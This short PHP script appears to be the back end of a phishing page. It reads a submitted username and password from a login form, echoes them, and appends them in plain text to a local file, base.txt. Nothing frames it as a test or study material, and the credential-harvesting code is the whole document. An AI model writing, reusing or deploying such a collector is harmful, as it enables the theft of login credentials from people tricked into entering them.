<?php

$username = htmlspecialchars($_POST['login']);
$password = htmlspecialchars($_POST['pass']);



print 'Username: ' . ' ' . $username . '<br>Password: ' . $password;

$fd = fopen('base.txt', 'a+') or die('NO!');
$str_login = 'Username: ' . ' ' . $username;
$str_pass = 'Password: ' . ' ' . $password;
fwrite($fd, $str_login . "\r\n" . $str_pass . "\r\n" . "\r\n");
fclose($fd);
?>
